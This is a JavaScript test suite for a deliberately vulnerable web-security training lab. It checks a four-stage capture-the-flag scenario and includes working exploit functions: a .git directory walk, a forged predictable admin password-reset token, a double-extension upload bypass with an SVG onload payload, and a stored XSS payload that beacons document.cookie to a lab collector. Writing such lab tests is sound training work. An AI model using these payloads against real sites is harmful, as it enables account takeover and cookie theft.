'use strict';
// M12 scenario tests: "Ghost in the CMS" chains four real exploits in order:
//   misconfig/git -> auth/reset-predictable -> upload/upload-double-ext -> xss/stored
// Each stage unlocks only when its underlying challenge is captured in the
// student's own session, and the scenario flag banner appears only after all
// four are captured. Locked stages must never leak their challenge links.
//
// Contract this suite assumes (infra lead): 
//  - GET /scenarios -> 200, lists "Ghost in the CMS" with a link to
//    /scenarios/ghost-in-the-cms.
//  - GET /scenarios/ghost-in-the-cms -> 200, with four stage blocks marked
//    id="stage-1" through id="stage-4" (or "Stage N" headings as fallback).
//  - An unlocked stage shows an "Enter the challenge" anchor; a locked stage
//    shows no anchor to any module route.
//  - After all four captures, the scenario page shows a banner with the
//    scenario flag, matching the flags table row
//    (module_id='scenario', vuln_id='ghost-in-the-cms').
const test = require('node:test');
const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const vm = require('node:vm');
const { bootLab, flagFromDb, capturedSet, FLAG_RE } = require('./helpers');

const SCENARIO_ID = 'ghost-in-the-cms';
const SCENARIO_TITLE = 'Ghost in the CMS';
const SCENARIO_PATH = '/scenarios/' + SCENARIO_ID;

// ---------------------------------------------------------------- session
// One object == one student browser: a shared cookie jar across GET, form
// POST and raw-binary POST (the upload stages need raw bytes).
function session(base) {
  let cookie = '';
  async function send(method, url, { body, headers } = {}) {
    const res = await fetch(base + url, {
      method,
      redirect: 'manual',
      headers: { ...(cookie ? { cookie } : {}), ...headers },
      body,
    });
    const set = res.headers.getSetCookie ? res.headers.getSetCookie() : [];
    for (const sc of set) {
      const pair = sc.split(';')[0];
      const name = pair.split('=')[0];
      cookie = cookie.split('; ').filter((p) => p && !p.startsWith(name + '=')).concat(pair).join('; ');
    }
    const text = await res.text();
    return { status: res.status, text, headers: res.headers };
  }
  return {
    get: (url, headers) => send('GET', url, { headers }),
    post: (url, form, headers) => send('POST', url, {
      headers: { 'content-type': 'application/x-www-form-urlencoded', ...headers },
      body: new URLSearchParams(form).toString(),
    }),
    postRaw: (url, body, headers) => send('POST', url, { body, headers }),
    cookie: () => cookie,
  };
}

// ---------------------------------------------------------------- page checks
const ENTER_RE = /<a\b[^>]*>(?:(?!<\/a>)[\s\S])*?Enter the challenge(?:(?!<\/a>)[\s\S])*?<\/a>/gi;
function enterLinks(html) {
  return html.match(ENTER_RE) || [];
}

function assertNoEmDash(text, label) {
  assert.ok(!text.includes('\u2014'), label + ': em dash on the page');
}

function assertNoFlag(text, label) {
  assert.equal((text.match(FLAG_RE) || []).length, 0, label + ': flag leaked on the page');
}

// One segment per stage, keyed by stage number. Primary contract is
// id="stage-N"; falls back to "Stage N" headings.
function stageSegments(html) {
  let marks = [...html.matchAll(/id="stage-(\d)"/gi)];
  if (marks.length < 4) marks = [...html.matchAll(/<h[1-4][^>]*>\s*Stage\s*(\d)\b/gi)];
  assert.ok(marks.length >= 4, 'expected four stage blocks on the scenario page (id="stage-N" or "Stage N" headings)');
  const segs = {};
  marks.forEach((m, i) => {
    const start = m.index;
    const end = i + 1 < marks.length ? marks[i + 1].index : html.length;
    segs[m[1]] = html.slice(start, end);
  });
  return segs;
}

const MODULE_HREF_RE = /<a\b[^>]*href="\/(misconfig|auth|upload|xss)\//i;
function assertStageLocked(html, n) {
  const seg = stageSegments(html)[String(n)];
  assert.ok(seg, 'stage ' + n + ' block not found on the scenario page');
  assert.equal(enterLinks(seg).length, 0, 'stage ' + n + ' is locked but shows an "Enter the challenge" link');
  assert.ok(!MODULE_HREF_RE.test(seg), 'stage ' + n + ' is locked but leaks a challenge href');
}

async function assertEnterLinksResolve(c, html, label) {
  for (const a of enterLinks(html)) {
    const href = (a.match(/href="([^"]*)"/i) || [])[1];
    assert.ok(href && href.startsWith('/'), label + ': enter link has no usable href');
    const r = await c.get(href.split('#')[0]);
    assert.notEqual(r.status, 404, label + ': enter link ' + href + ' is dead');
  }
}

function scenarioFlag(dataDir) {
  try {
    return flagFromDb(dataDir, 'scenario', SCENARIO_ID);
  } catch {
    assert.fail('flags table has no row for scenario/' + SCENARIO_ID + ' (not seeded by the infra lead yet)');
  }
}

// ---------------------------------------------------------------- exploits
// Stage 1: the real misconfig/git walk (see tests/misconfig.test.js).
async function exploitMisconfigGit(c) {
  const head = await c.get('/misconfig/.git/HEAD');
  assert.equal(head.status, 200);
  assert.ok(head.text.includes('refs/heads/main'));
  const ref = await c.get('/misconfig/.git/refs/heads/main');
  const commit = ref.text.trim();
  assert.match(commit, /^[0-9a-f]{40}$/, 'the ref must resolve to a commit hash');
  const hit = await c.get('/misconfig/.git/objects/' + commit.slice(0, 2) + '/' + commit.slice(2));
  assert.equal(hit.status, 200);
  assert.ok((await capturedSet(c)).includes('misconfig:Exposed .git Directory'), 'git challenge not captured');
}

// Stage 2: the real auth/reset-predictable forgery (see tests/auth.test.js).
async function exploitAuthResetPredictable(c) {
  const token = crypto.createHash('sha256').update('admin' + 'reset-salt').digest('hex');
  const hit = await c.post('/auth/sha-reset/confirm', { token, newPassword: 'admin123' });
  assert.ok(hit.text.includes('Password changed'), 'reset confirm did not go through');
  assert.ok((await capturedSet(c)).includes('auth:SHA-256 Predictable Reset Token'), 'reset-predictable challenge not captured');
}

// Stage 3: the real upload/upload-double-ext bypass (see tests/upload.test.js).
async function exploitUploadDoubleExt(c) {
  const OCTET = { 'content-type': 'application/octet-stream' };
  const hit = await c.postRaw('/upload/ext-blacklist?filename=shell-ghost.svg.jpg', Buffer.from('<svg onload="alert(1)"></svg>'), OCTET);
  assert.equal(hit.status, 200);
  assert.ok((await capturedSet(c)).includes('upload:Extension blacklist bypass'), 'upload-double-ext challenge not captured');
}

// ---------------------------------------------------------------- xss browser sim (from tests/xss.test.js)
const TAG_RE = /<(\/?)([a-zA-Z][^\s/>]*)((?:"[^"]*"|'[^']*'|[^>"'])*)>/g;

function liveScripts(html) {
  const src = html.replace(/<!--[\s\S]*?-->/g, '').replace(/<textarea\b[^>]*>[\s\S]*?<\/textarea>/gi, '');
  const out = [];
  TAG_RE.lastIndex = 0;
  let m;
  while ((m = TAG_RE.exec(src))) {
    if (m[1] === '/' || m[2].toLowerCase() !== 'script') continue;
    const i = src.slice(TAG_RE.lastIndex).search(/<\/script/i);
    const end = i >= 0 ? TAG_RE.lastIndex + i : src.length;
    if (!/\bsrc\s*=/.test(m[3])) out.push(src.slice(TAG_RE.lastIndex, end));
    TAG_RE.lastIndex = end;
  }
  return out;
}

function makeBrowser(cookie) {
  const calls = [];
  const errors = [];
  const els = {};
  const el = (id) => (els[id] = els[id] || {
    style: {}, textContent: '', innerHTML: '', hidden: true,
    getAttribute: () => '/xss/claim-status?v=none',
    querySelector: () => ({ style: {} }),
  });
  const ctx = {
    document: { cookie, getElementById: el },
    location: { hash: '', search: '' },
    fetch: (u) => { calls.push(String(u)); return Promise.resolve({ json: () => Promise.resolve({ captured: false }) }); },
    setInterval: () => 0,
    alert: () => { calls.push('ALERT'); },
    URLSearchParams,
    decodeURIComponent,
  };
  ctx.window = ctx;
  vm.createContext(ctx);
  const run = (code) => {
    try { vm.runInContext(code, ctx, { timeout: 1000 }); } catch (e) { errors.push(e.message); }
  };
  return {
    errors, run,
    runPage: (html) => liveScripts(html).forEach(run),
    beacons: () => calls.filter((u) => u.startsWith('/xss/collect')),
  };
}

// Stage 4: the real xss/stored exploit with the beacon claim flow
// (see tests/xss.test.js).
async function exploitXssStored(c) {
  const payload = '<script>fetch(\'/xss/collect?c=\'+document.cookie+\'&v=stored&n=\'+window.__px)</script>';
  const posted = await c.post('/xss/guestbook', { author: 'mallory', body: payload });
  assert.ok([200, 302].includes(posted.status), 'guestbook post failed with ' + posted.status);
  const page = await c.get('/xss/guestbook');
  assert.ok(page.text.includes('mallory'), 'the payload was not stored');
  const b = makeBrowser(c.cookie());
  b.runPage(page.text);
  assert.deepEqual(b.errors, [], 'page scripts errored in the browser sim');
  const beacons = b.beacons();
  assert.ok(beacons.length >= 1, 'the stored payload did not beacon');
  let hit = null;
  for (const url of beacons) {
    const r = await c.get(url);
    if (r.status === 200) { hit = r; break; }
  }
  assert.ok(hit, 'the collector rejected every beacon');
  assert.ok((await capturedSet(c)).includes('xss:Stored XSS'), 'xss/stored challenge not captured');
  return hit;
}

// ---------------------------------------------------------------- suite
test('ghost in the cms scenario', async (t) => {
  const { srv, dataDir } = await bootLab(t);
  const base = srv.base;

  // The scenario routes are wired by the infra lead; if they are not live
  // yet, report it once and skip the rest of the suite.
  const probe = await session(base).get('/scenarios').catch(() => ({ status: 0 }));
  if (probe.status === 404 || probe.status === 0) {
    await t.test('scenario routes are wired by the infra lead', () => {
      assert.fail('GET /scenarios is not served yet: routes not wired, rest of this suite skipped');
    });
    return;
  }

  const att = session(base); // the attacker: one session for the whole chain

  await t.test('scenario index lists Ghost in the CMS', async () => {
    const c = session(base);
    const { status, text } = await c.get('/scenarios');
    assert.equal(status, 200);
    assert.ok(text.includes(SCENARIO_TITLE), 'scenario title missing from the index');
    assert.ok(text.includes('href="' + SCENARIO_PATH + '"'), 'index does not link ' + SCENARIO_PATH);
    assertNoEmDash(text, 'scenario index');
    assertNoFlag(text, 'scenario index');
  });

  await t.test('fresh page: only stage 1 unlocked, locked stages leak nothing', async () => {
    const c = session(base);
    const { status, text } = await c.get(SCENARIO_PATH);
    assert.equal(status, 200);
    assert.ok(text.includes(SCENARIO_TITLE), 'scenario title missing from the page');
    assertNoEmDash(text, 'fresh scenario page');
    assertNoFlag(text, 'fresh scenario page');
    assert.equal(enterLinks(text).length, 1, 'exactly one stage should be unlocked for a fresh student');
    await assertEnterLinksResolve(c, text, 'fresh scenario page');
    assertStageLocked(text, 2);
    assertStageLocked(text, 3);
    assertStageLocked(text, 4);
  });

  await t.test('stage 1 (misconfig/git): HEAD alone unlocks nothing, the full walk unlocks stage 2', async () => {
    const early = session(base);
    await early.get('/misconfig/.git/HEAD');
    const locked = await early.get(SCENARIO_PATH);
    assert.equal(enterLinks(locked.text).length, 1, 'HEAD alone must not unlock stage 2');
    await exploitMisconfigGit(att);
    const { text } = await att.get(SCENARIO_PATH);
    assert.equal(enterLinks(text).length, 2, 'stage 2 should unlock after the git exploit');
    assert.equal(enterLinks(stageSegments(text)['2']).length, 1, 'the new link should sit in the stage 2 block');
    await assertEnterLinksResolve(att, text, 'scenario page after stage 1');
    assertStageLocked(text, 3);
    assertStageLocked(text, 4);
    assertNoEmDash(text, 'scenario page after stage 1');
    assertNoFlag(text, 'scenario page after stage 1');
  });

  await t.test('stage 2 (auth/reset-predictable): wrong tokens unlock nothing, the forged admin token unlocks stage 3', async () => {
    const wrong = session(base);
    const badToken = crypto.createHash('sha256').update('admin').digest('hex');
    const r1 = await wrong.post('/auth/sha-reset/confirm', { token: badToken, newPassword: 'x' });
    assert.equal((r1.text.match(FLAG_RE) || []).length, 0, 'unsalted token must earn nothing');
    const aliceToken = crypto.createHash('sha256').update('alice' + 'reset-salt').digest('hex');
    await wrong.post('/auth/sha-reset/confirm', { token: aliceToken, newPassword: 'alice123' });
    const locked = await wrong.get(SCENARIO_PATH);
    assert.equal(enterLinks(locked.text).length, 1, 'wrong and alice-only tokens must not unlock stage 3');
    await exploitAuthResetPredictable(att);
    const { text } = await att.get(SCENARIO_PATH);
    assert.equal(enterLinks(text).length, 3, 'stage 3 should unlock after the reset exploit');
    assert.equal(enterLinks(stageSegments(text)['3']).length, 1, 'the new link should sit in the stage 3 block');
    await assertEnterLinksResolve(att, text, 'scenario page after stage 2');
    assertStageLocked(text, 4);
    assertNoEmDash(text, 'scenario page after stage 2');
    assertNoFlag(text, 'scenario page after stage 2');
  });

  await t.test('stage 3 (upload/upload-double-ext): other bypasses unlock nothing, shell.svg.jpg unlocks stage 4', async () => {
    const OCTET = { 'content-type': 'application/octet-stream' };
    const other = session(base);
    const plain = await other.postRaw('/upload/ext-blacklist?filename=plain-ghost.jpg', Buffer.from('fakejpg'), OCTET);
    assert.equal(plain.status, 200);
    const caseUp = await other.postRaw('/upload/ext-blacklist?filename=case-ghost.SVG', Buffer.from('<svg onload="alert(1)"></svg>'), OCTET);
    assert.equal(caseUp.status, 200);
    assert.ok((await capturedSet(other)).includes('upload:Case-sensitive blacklist bypass'), 'sanity: the case bypass captured its own challenge');
    const locked = await other.get(SCENARIO_PATH);
    assert.equal(enterLinks(locked.text).length, 1, 'plain uploads and the case bypass must not unlock stage 4');
    await exploitUploadDoubleExt(att);
    const { text } = await att.get(SCENARIO_PATH);
    assert.equal(enterLinks(text).length, 4, 'stage 4 should unlock after the double-extension exploit');
    assert.equal(enterLinks(stageSegments(text)['4']).length, 1, 'the new link should sit in the stage 4 block');
    await assertEnterLinksResolve(att, text, 'scenario page after stage 3');
    assertNoEmDash(text, 'scenario page after stage 3');
    assertNoFlag(text, 'scenario page after stage 3: the flag must wait for stage 4');
  });

  await t.test('stage 4 (xss/stored): benign posts drop nothing, the stored beacon drops the scenario flag', async () => {
    const benign = session(base);
    await benign.post('/xss/guestbook', { author: 'sam', body: 'Great coffee, lovely staff.' });
    const locked = await benign.get(SCENARIO_PATH);
    assert.equal(enterLinks(locked.text).length, 1, 'a benign guestbook post must not finish the scenario');
    assertNoFlag(locked.text, 'scenario page after a benign post');
    const hit = await exploitXssStored(att);
    assert.ok(hit.text.includes(flagFromDb(dataDir, 'xss', 'stored')), 'the collector should return the xss stored flag');
    const { status, text } = await att.get(SCENARIO_PATH);
    assert.equal(status, 200);
    const shown = text.match(/PENTRIX\{[0-9a-f]{32}\}/);
    assert.ok(shown, 'no scenario flag banner on the finished page');
    assert.equal(shown[0], scenarioFlag(dataDir), 'the banner flag does not match the seeded scenario flag');
    assertNoEmDash(text, 'finished scenario page');
  });

  await t.test('fresh client: locked stages leak no links and no flag', async () => {
    const c = session(base);
    const { status, text } = await c.get(SCENARIO_PATH);
    assert.equal(status, 200);
    assert.equal(enterLinks(text).length, 1, 'a fresh student must see only the stage 1 link');
    assertStageLocked(text, 2);
    assertStageLocked(text, 3);
    assertStageLocked(text, 4);
    assertNoFlag(text, 'fresh scenario page');
    assertNoEmDash(text, 'fresh scenario page');
    for (const entry of ['/misconfig/.git/HEAD', '/auth/sha-reset', '/upload/ext-blacklist', '/xss/guestbook']) {
      assert.ok(!text.includes('href="' + entry + '"'), 'locked entry leaked as a link: ' + entry);
    }
  });

  await t.test('no em dashes on any scenario page state', async () => {
    for (const [label, c] of [['fresh', session(base)], ['finished', att]]) {
      for (const path of ['/scenarios', SCENARIO_PATH]) {
        const { status, text } = await c.get(path);
        assert.equal(status, 200, label + ' ' + path);
        assertNoEmDash(text, label + ' ' + path);
      }
    }
  });
});
